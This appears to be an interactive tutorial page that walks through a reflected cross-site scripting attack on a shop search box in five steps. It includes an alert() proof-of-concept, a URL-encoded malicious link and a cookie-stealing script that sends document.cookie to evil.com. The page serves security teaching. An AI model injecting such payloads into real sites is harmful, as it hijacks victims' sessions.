🧠 The Core Idea

XSS happens when a web app takes user input and writes it back to the page without checking it first. The browser then executes whatever it finds — including attacker-supplied JavaScript.

💡

In one sentence: The browser cannot tell the difference between the developer's JavaScript and the attacker's JavaScript — it runs them both.

🎬 The XSS Attack — Step by Step

Click Next Step or the numbered dots to walk through each phase of a Reflected XSS attack.

Step 1 / 5 — Attacker Finds a Reflection Point
🔍 Attacker Finds a Reflection Point
The attacker finds an input field — like a search box — where typed text appears directly in the page. The server takes the input and "reflects" it back inside the HTML response.
Attacker types: laptop
Page shows: You searched for: laptop
HTML source:
<p>You searched for: laptop</p>
⚗️ Attacker Crafts a Malicious Payload
Instead of a search term, the attacker injects a <script> tag. If the server doesn't sanitize input, the script lands inside the HTML and the browser executes it.
Attacker types: <script>alert('XSS')</script>
Server returns:
<p>You searched for: <script>alert('XSS')</script></p>
⚠ The script tag is now inside the page HTML
🔗 Attacker Sends the URL to a Victim
The payload is embedded into a URL and sent to a victim by email or chat. It looks like a real link to a legitimate site — making it convincing.
Malicious URL:
https://shop.example.com/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
Payload is URL-encoded — still executes when the browser decodes it
💀 Victim's Browser Executes the Script
The victim clicks the link. Their browser requests the page, receives the HTML with the embedded script, and executes it — inside the context of the legitimate website.
What the browser receives:
<html>
  <p>You searched for: <script>alert('XSS')</script></p>
</html>
🔥 Attacker's JS runs on the victim's machine
🍪 Attacker Steals the Session Cookie
In a real attack the payload doesn't show an alert — it silently reads the session cookie and sends it to the attacker's server. The attacker can then log in as the victim with no password needed.
Real-world payload:
<script>
  fetch('https://evil.com/steal?c=' + document.cookie);
</script>
🚨 Session hijacked — victim never notices
